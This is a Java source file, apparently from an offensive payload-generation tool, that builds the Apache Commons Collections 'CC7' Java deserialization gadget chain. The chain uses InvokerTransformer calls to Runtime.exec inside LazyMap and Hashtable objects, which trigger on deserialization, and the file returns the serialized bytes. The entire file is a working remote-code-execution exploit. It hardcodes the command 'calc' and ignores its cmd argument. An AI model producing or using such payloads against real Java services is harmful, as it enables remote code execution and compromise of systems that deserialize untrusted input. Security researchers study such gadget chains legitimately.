package cn.safe6.payload.shortPayload.payload;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CC7 extends Payload {
    @SuppressWarnings("all")
    public static byte[] getPayloadUseCommand(String cmd) {
        try {
            Transformer[] fakeTransformer = new Transformer[]{};
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
                            new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
                            new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
            };
            Transformer chainedTransformer = new ChainedTransformer(fakeTransformer);
            Map innerMap1 = new HashMap();
            Map innerMap2 = new HashMap();
            Map lazyMap1 = LazyMap.decorate(innerMap1, chainedTransformer);
            lazyMap1.put("yy", 1);
            Map lazyMap2 = LazyMap.decorate(innerMap2, chainedTransformer);
            lazyMap2.put("zZ", 1);
            Hashtable hashtable = new Hashtable();
            hashtable.put(lazyMap1, "test");
            hashtable.put(lazyMap2, "test");
            Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
            field.setAccessible(true);
            field.set(chainedTransformer, transformers);
            lazyMap2.remove("yy");
            return serialize(hashtable);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new byte[]{};
    }
}
